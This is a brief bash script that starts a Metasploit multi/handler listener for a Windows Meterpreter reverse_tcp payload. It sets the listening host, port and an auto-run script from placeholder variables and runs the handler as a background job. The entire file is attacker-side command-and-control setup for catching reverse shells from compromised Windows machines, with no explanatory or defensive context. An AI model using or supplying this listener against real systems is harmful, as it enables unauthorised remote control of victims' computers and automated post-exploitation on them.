#!/bin/bash

x="ip"
y="port"
z="autorunpath"

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST $x;
set LPORT $y;
set AutoRunScript $z;
exploit -j;
"
